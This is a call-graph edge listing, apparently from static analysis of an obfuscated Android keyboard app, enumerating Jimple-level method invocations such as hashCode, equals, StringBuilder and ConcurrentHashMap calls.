VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <java.lang.String: int hashCode()>
STATIC edge: $i6 = staticinvoke <izw: int aj(java.lang.Object,int)>($r2, $i5) in <ljf: int o(int,int,int,int)> ==> <izw: int aj(java.lang.Object,int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsu: void <init>()> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <hcb: void <init>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
SPECIAL edge: specialinvoke $r2.<lji: void <init>(java.util.Comparator)>($r0) in <lqd: lqd b(java.util.Comparator)> ==> <lji: void <init>(java.util.Comparator)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: int hashCode()>
VIRTUAL edge: $l4 = virtualinvoke $r17.<java.util.concurrent.atomic.AtomicLong: long get()>() in <lsd: boolean b(lsr)> ==> <java.util.concurrent.atomic.AtomicLong: long get()>
SPECIAL edge: specialinvoke r0.<lma: void <init>()>() in <lmp: void <init>()> ==> <lma: void <init>()>
STATIC edge: $r5 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i1) in <iye: void O(int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorStickerSearchMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
STATIC edge: $i1 = staticinvoke <java.lang.Math: int max(int,int)>($i1, 2) in <lma: int e(int)> ==> <java.lang.Math: int max(int,int)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lkq: java.util.Iterator iterator()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r3) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: int hashCode()>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lqr: java.util.Iterator iterator()>
STATIC edge: $r5 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i0) in <iye: void O(int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<ljd: int size()>() in <liy: int size()> ==> <ljd: int size()>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <ljd: java.lang.Object[] x()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lnc: boolean hasNext()>
SPECIAL edge: specialinvoke $r3.<lqk: void <init>(java.lang.Object,java.lang.Object[],int,lqk)>($r2, $r1, $i0, r0) in <lqk: void <init>(java.lang.Object[],int)> ==> <lqk: void <init>(java.lang.Object,java.lang.Object[],int,lqk)>
INTERFACE edge: interfaceinvoke $r5.<java.util.Collection: boolean add(java.lang.Object)>($r2) in <lli: void e(java.lang.Object,java.lang.Object)> ==> <java.util.AbstractCollection: boolean add(java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<lvt: void <init>(lvr)>($r3) in <lvt: void <clinit>()> ==> <lvt: void <init>(lvr)>
VIRTUAL edge: virtualinvoke $r0.<java.lang.Object: java.lang.Class getClass()>() in <iye: java.lang.Object w(java.lang.Object)> ==> <java.lang.Object: java.lang.Class getClass()>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lmb: lme f()> ==> <lrg: int size()>
VIRTUAL edge: virtualinvoke $r6.<lly: void j(java.lang.Object)>($r8) in <hbw: java.lang.Object a(java.lang.Object)> ==> <lly: void j(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: int hashCode()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lqr: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <iye: java.lang.Object w(java.lang.Object)>
VIRTUAL edge: $r6 = virtualinvoke $r3.<java.lang.Object: java.lang.Class getClass()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.Object: java.lang.Class getClass()>
INTERFACE edge: $i1 = interfaceinvoke $r2.<java.util.List: int size()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lql: int size()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<lma: boolean m()>() in <lma: lma p(java.util.Collection)> ==> <lrg: boolean m()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $r9 = virtualinvoke $r9.<java.lang.String: java.lang.String concat(java.lang.String)>($r4) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
CLINIT edge: staticinvoke <hbw: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hbw: void <clinit>()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(64) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
STATIC edge: $r5 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r1) in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <java.lang.Object: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljf: boolean isEmpty()>() in <ljf: int c()> ==> <ljf: boolean isEmpty()>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lmb: lme f()> ==> <lnc: java.lang.Object next()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lqs: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r4.<ltc: void <init>(java.lang.String,int,int)>("FULL", 3, $i0) in <ltc: void <clinit>()> ==> <ltc: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Object: int hashCode()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lrg: int hashCode()>
STATIC edge: staticinvoke <iye: void D(boolean,java.lang.String,int,int)>(1, "min (%s) must be less than or equal to max (%s)", $i0, $i1) in <kwe: int U(int,int,int)> ==> <iye: void D(boolean,java.lang.String,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <lqs: boolean equals(java.lang.Object)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<lts: lsz c(int)>($i1) in <lsd: boolean b(lsr)> ==> <lsm: lsz c(int)>
SPECIAL edge: specialinvoke r0.<lkh: void <init>()>() in <lkq: void <init>()> ==> <lkh: void <init>()>
INTERFACE edge: $r5 = interfaceinvoke $r10.<java.util.Iterator: java.lang.Object next()>() in <hbv: void j()> ==> <lnc: java.lang.Object next()>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r1) in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
STATIC edge: $i2 = staticinvoke <java.lang.System: int identityHashCode(java.lang.Object)>($r3) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.System: int identityHashCode(java.lang.Object)>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map: java.lang.Object get(java.lang.Object)>($r3) in <ljb: java.lang.Object getValue()> ==> <java.util.LinkedHashMap: java.lang.Object get(java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<java.util.concurrent.atomic.AtomicInteger: void <init>()>() in <lsu: void <init>()> ==> <java.util.concurrent.atomic.AtomicInteger: void <init>()>
SPECIAL edge: specialinvoke $r0.<java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)>($r1) in <iye: void Q(int,int)> ==> <java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r4) in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
SPECIAL edge: specialinvoke $r6.<j$.util.concurrent.c: void <init>(long)>($l0) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.c: void <init>(long)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <izw: void as(int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<java.lang.ThreadLocal: java.lang.Object get()>() in <j$.util.concurrent.ThreadLocalRandom: void c()> ==> <java.lang.ThreadLocal: java.lang.Object get()>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: java.util.Map o()>() in <ljd: java.util.Iterator l()> ==> <ljd: java.util.Map o()>
INTERFACE edge: $z0 = interfaceinvoke $r1.<java.util.Iterator: boolean hasNext()>() in <llg: boolean hasNext()> ==> <lsb: boolean hasNext()>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("=null") in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r4) in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
STATIC edge: staticinvoke <iye: void y(boolean,java.lang.Object)>($z0, "collection too large") in <lma: int e(int)> ==> <iye: void y(boolean,java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r2.<java.lang.String: java.lang.String concat(java.lang.String)>($r4) in <ivw: java.lang.String p()> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.Class: java.lang.Object cast(java.lang.Object)>($r2) in <lsz: java.lang.Object d(java.lang.Object)> ==> <java.lang.Class: java.lang.Object cast(java.lang.Object)>
VIRTUAL edge: $r5 = virtualinvoke $r0.<hcb: java.lang.Object l(java.lang.String,ldp)>($r2, $r4) in <hbu: hbs f(java.lang.String,long)> ==> <hcb: java.lang.Object l(java.lang.String,ldp)>
STATIC edge: staticinvoke <java.util.Arrays: void fill(short[],short)>($r7, $s8) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.Arrays: void fill(short[],short)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lrg: int hashCode()>
INTERFACE edge: $r8 = interfaceinvoke $r9.<lse: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag", "extractLanguageAndCountryFromLocale", 260, "LanguageTag.java") in <ivw: ivw d(java.util.Locale)> ==> <lsv: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<lma: boolean d()>() in <lma: boolean equals(java.lang.Object)> ==> <lma: boolean d()>
VIRTUAL edge: $r4 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.String toString()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
STATIC edge: $r5 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r4, $i0) in <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
SPECIAL edge: specialinvoke $r2.<java.lang.NullPointerException: void <init>(java.lang.String)>("Both parameters are null") in <iye: java.lang.Object V(java.lang.Object,java.lang.Object)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
STATIC edge: $r1 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r1, $i0) in <lkt: void e(int)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
SPECIAL edge: specialinvoke r0.<lsa: void <init>()>() in <lnc: void <init>(java.lang.Object)> ==> <lsa: void <init>()>
SPECIAL edge: specialinvoke $r25.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)>($i5, $r15, $r16, $r12) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<java.lang.StringBuilder: java.lang.String toString()>() in <iye: void O(int,int)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r0.<java.util.ArrayList: void <init>()>() in <lri: java.util.ArrayList N()> ==> <java.util.ArrayList: void <init>()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <java.lang.String: void <init>(char[],int,int)> ==> <java.lang.Object: void <init>()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorStaticImage", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <liz: java.lang.Object next()>
VIRTUAL edge: $i3 = virtualinvoke $r2.<java.lang.String: int indexOf(java.lang.String,int)>("%s", $i1) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.String: int indexOf(java.lang.String,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lqr: int hashCode()>
INTERFACE edge: $z0 = interfaceinvoke $r5.<java.util.Iterator: boolean hasNext()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lsb: boolean hasNext()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $r3 = virtualinvoke r0.<ljd: java.lang.Object k(int)>($i0) in <ljd: java.util.Map m()> ==> <ljd: java.lang.Object k(int)>
CLINIT edge: staticinvoke <lqq: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lqq: void <clinit>()>
STATIC edge: $r2 = staticinvoke <java.lang.reflect.Array: java.lang.Object newInstance(java.lang.Class,int)>($r1, $i0) in <lri: java.lang.Object[] o(java.lang.Object[],int)> ==> <java.lang.reflect.Array: java.lang.Object newInstance(java.lang.Class,int)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorAnimatedImage", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: $r12 = virtualinvoke r0.<lsn: lts l()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsn: lts l()>
STATIC edge: $r7 = staticinvoke <java.util.regex.Pattern: java.util.regex.Pattern compile(java.lang.String)>("\\p{Punct}*") in <iwt: void <clinit>()> ==> <java.util.regex.Pattern: java.util.regex.Pattern compile(java.lang.String)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lmb: lme f()> ==> <lsb: java.lang.Object next()>
INTERFACE edge: $r5 = interfaceinvoke $r10.<java.util.Iterator: java.lang.Object next()>() in <hbv: void j()> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $r3 = virtualinvoke $r1.<java.lang.Object: java.lang.Class getClass()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <java.lang.Object: java.lang.Class getClass()>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(8) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsa: void <init>()> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r2.<java.lang.StringBuilder: void <init>()>() in <iye: void O(int,int)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: virtualinvoke r0.<lsn: void q(lsz,java.lang.Object)>($r3, $r6) in <lsd: boolean b(lsr)> ==> <lsn: void q(lsz,java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lkq: int hashCode()>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("=") in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<lly: void <init>()>() in <lma: lly g()> ==> <lly: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <lma: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r2.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("negative size: ") in <iye: void O(int,int)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
CLINIT edge: staticinvoke <ljs: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ljs: void <clinit>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: boolean equals(java.lang.Object)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.String: int hashCode()>
INTERFACE edge: $r5 = interfaceinvoke $r10.<java.util.Iterator: java.lang.Object next()>() in <hbv: void j()> ==> <llg: java.lang.Object next()>
VIRTUAL edge: $z2 = virtualinvoke $r2.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l3, 0, 1) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" [") in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.lang.Object: int hashCode()>
SPECIAL edge: specialinvoke r0.<lmp: void <init>()>() in <lmo: void <init>(java.util.Comparator)> ==> <lmp: void <init>()>
VIRTUAL edge: $r3 = virtualinvoke $r14.<lkl: lkq g()>() in <hbw: java.lang.Object a(java.lang.Object)> ==> <lkl: lkq g()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(6) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <j$.util.concurrent.k: boolean equals(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
INTERFACE edge: $r4 = interfaceinvoke $r0.<java.util.List: java.util.Iterator iterator()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lkq: java.util.Iterator iterator()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
STATIC edge: $i1 = staticinvoke <java.lang.System: int identityHashCode(java.lang.Object)>($r1) in <j$.util.concurrent.r: int i(java.lang.Object,java.lang.Object)> ==> <java.lang.System: int identityHashCode(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.util.LinkedHashSet: void <init>(java.util.Collection)>($r2) in <ose: void <clinit>()> ==> <java.util.LinkedHashSet: void <init>(java.util.Collection)>
CLINIT edge: staticinvoke <java.lang.Integer: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Integer: void <clinit>()>
INTERFACE edge: $z0 = interfaceinvoke $r1.<java.util.Iterator: boolean hasNext()>() in <llg: java.lang.Object next()> ==> <lsb: boolean hasNext()>
VIRTUAL edge: virtualinvoke $r4.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i1) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <lid: boolean equals(java.lang.Object)>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.List: java.lang.Object get(int)>($i1) in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lql: java.lang.Object get(int)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<ljd: java.util.Map o()>() in <ljb: java.lang.Object getValue()> ==> <ljd: java.util.Map o()>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkh: int size()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lqr: int size()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<j$.util.concurrent.d: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)>($r2, $i0, $i0, $r1) in <j$.util.concurrent.e: java.util.Iterator iterator()> ==> <j$.util.concurrent.d: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)>
STATIC edge: $r1 = staticinvoke <lma: lma i(int,java.lang.Object[])>($i0, $r2) in <lma: lma p(java.util.Collection)> ==> <lma: lma i(int,java.lang.Object[])>
SPECIAL edge: specialinvoke $r2.<java.lang.String: void <init>(char[])>($r1) in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: void <init>(char[])>
VIRTUAL edge: $z0 = virtualinvoke $r5.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lsd: boolean b(lsr)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r18.<mag: void <init>(java.lang.String,int,int)>("EXPRESSIVE_STICKER_SEARCH", 18, 18) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean equals(java.lang.Object)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<lkx: lma q()>() in <llo: lma u()> ==> <lkx: lma q()>
SPECIAL edge: specialinvoke $r4.<liw: void <init>(ljd)>(r0) in <ljd: java.util.Iterator l()> ==> <liw: void <init>(ljd)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Object: int hashCode()>
SPECIAL edge: specialinvoke r0.<lid: void <init>()>() in <lki: void <init>(java.lang.Object,java.lang.Object)> ==> <lid: void <init>()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Throwable: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $i2 = staticinvoke <java.lang.Math: int max(int,int)>($i2, $i0) in <kwe: int U(int,int,int)> ==> <java.lang.Math: int max(int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lkx: void <init>()> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r9.<mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)>($r2, $r3, $r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("null key in entry: null=") in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r9 = virtualinvoke $r7.<mly: java.lang.IllegalArgumentException f()>() in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <mly: java.lang.IllegalArgumentException f()>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" and ") in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
CLINIT edge: staticinvoke <coo: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <coo: void <clinit>()>
STATIC edge: $r1 = staticinvoke <izw: java.lang.Object al(int)>($i4) in <ljd: int z(int,int,int,int)> ==> <izw: java.lang.Object al(int)>
SPECIAL edge: specialinvoke $r1.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <iye: void y(boolean,java.lang.Object)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Enum: int hashCode()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r10.<java.lang.StringBuilder: void <init>(int)>($i1) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: void <init>(int)>
